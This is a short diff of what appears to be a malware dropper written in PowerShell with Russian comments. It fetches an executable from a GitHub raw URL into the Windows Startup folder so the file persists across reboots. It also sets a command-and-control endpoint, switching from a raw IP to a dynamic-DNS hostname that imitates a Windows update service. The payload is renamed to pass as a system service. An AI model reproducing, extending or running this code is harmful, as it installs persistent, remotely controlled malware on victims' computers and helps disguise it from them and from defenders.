@@ -1,7 +1,7 @@
-$url = "https://raw.githubusercontent.com/xzj4/3/refs/heads/main/rncmsvc.exe"
+$url = "https://raw.githubusercontent.com/xzj4/3/refs/heads/main/SStpSvc.exe"
 #$destPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wcrnsvc.exe"
 cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
-$destPath = ".\rncmsvc.exe"
+$destPath = ".\SStpSvc.exe"
 # 1. Блок скачивания файла
 try {
     if (-not (Test-Path $destPath)) {
@@ -11,7 +11,7 @@ try {
 } catch {
     Write-Host "Download Error: $($_.Exception.Message)" -ForegroundColor Yellow
 }
-$ip = "46.101.172.27"
+$ip = "windows-rdnupdate.serveirc.com"
 $port = 8080
 
 try {
